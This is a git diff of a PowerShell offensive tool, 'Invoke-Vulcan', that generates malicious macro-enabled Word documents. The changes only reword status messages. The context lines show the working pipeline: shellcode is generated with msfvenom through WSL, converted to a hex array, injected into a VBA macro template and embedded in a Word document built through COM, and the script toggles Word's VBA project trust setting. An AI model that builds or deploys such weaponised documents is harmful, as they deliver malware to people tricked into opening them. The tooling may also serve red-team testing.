@@ -96,9 +96,9 @@ function Invoke-Vulcan {
     }
 
     end {
-        Write-Host "[-] Removing payload file..."
+        Write-Host "[-] Removing (raw) payload file..."
         Remove-Item -Path $PayloadOutput -Force
-        Write-Host "[-] Removing VBA macro file..."
+        Write-Host "[-] Removing (VBA) macro file..."
         Remove-Item -Path $MacroOutput -Force
         
         Write-Output "[+] Disabling trust access to VBA Project Object Model in Microsoft Word..."
@@ -107,13 +107,13 @@ function Invoke-Vulcan {
 }
 
 function Create_Payload($Payload, $PayloadOptions, $PayloadOutput) {
-    Write-Host "[i] Creating payload..."
+    Write-Host "[i] Creating (raw) payload..."
     $WSLPath = wsl.exe --exec wslpath -a $PayloadOutput
     $Command = "wsl.exe --exec msfvenom -p $Payload $PayloadOptions -f raw -o $WSLPath"
 
     Write-Host "[i] Running command: $Command"
     Invoke-Expression -Command $Command # | Out-Null
-    Write-Host "[i] Payload written to: $PayloadOutput"
+    Write-Host "[i] (Raw) payload written to: $PayloadOutput"
 }
 
 function Convert-RawToByteArray($ShellCode, $Treshold) {
@@ -179,15 +179,15 @@ function Convert-RawToCharHexArray($ShellCode, $Treshold) {
 }
 
 function Create_MacroFromTemplate($ShellCode, $Template, $Treshold) {
-    Write-Host "[i] Creating VBA macro..."
+    Write-Host "[i] Creating (VBA) macro..."
     $PayloadArray = Convert-RawToCharHexArray -ShellCode $ShellCode -Treshold $Treshold
     Set-Content -Path $MacroOutput -Value (Get-Content -Path $Template).Replace("PAYLOAD", $PayloadArray)
 
-    Write-Host "[i] VBA macro written to: $MacroOutput"
+    Write-Host "[i] (VBA) macro written to: $MacroOutput"
 }
 
 function Create_WordDocument($MacroOutput, $Output) {
-    Write-Host "[i] Creating macro-enabled Word document..."
+    Write-Host "[i] Creating (macro-enabled) Word document..."
     $Word = New-Object -ComObject Word.Application
     $Doc = $Word.Documents.Add()
 
